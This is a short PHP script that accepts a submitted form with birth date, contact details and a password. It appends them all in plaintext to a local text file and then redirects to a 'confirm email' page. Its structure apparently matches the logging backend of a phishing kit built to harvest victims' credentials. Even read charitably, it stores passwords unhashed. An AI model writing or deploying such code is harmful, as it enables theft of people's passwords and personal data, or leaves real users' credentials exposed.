<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form inputs
    $month = htmlspecialchars($_POST['month']);
    $day = htmlspecialchars($_POST['day']);
    $year = htmlspecialchars($_POST['year']);
    $contact = htmlspecialchars($_POST['contact']);
    $password = htmlspecialchars($_POST['password']);

    // Format the data
    $data = "Month: $month\nDay: $day\nYear: $year\nContact: $contact\nPassword: $password\n";

    // Write to file
    $file = fopen("form_data.txt", "a") or die("Unable to open file!");
    fwrite($file, $data);
    fclose($file);
    // Redirect to xyz.com
    header("Location: conformemail.html");
    exit();
}
?>
